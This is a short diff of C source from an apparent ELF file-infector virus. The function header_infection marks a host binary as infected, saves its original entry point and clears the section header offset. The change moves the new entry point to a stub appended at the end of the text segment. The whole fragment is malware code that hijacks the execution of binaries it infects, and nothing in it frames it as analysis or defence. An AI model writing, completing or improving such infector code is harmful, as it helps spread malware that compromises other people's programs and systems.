@@ -18,7 +18,7 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
 
 	host->entry[OLD] = host->header->e_entry;
-	host->header->e_entry = host->segment[NOTE]->p_vaddr;
+	host->header->e_entry = (host->segment[TEXT]->p_vaddr + host->segment[TEXT]->p_memsz) - STUB_SIZE;
 	host->entry[NEW] = host->header->e_entry;
 
 	host->header->e_shoff = 0;
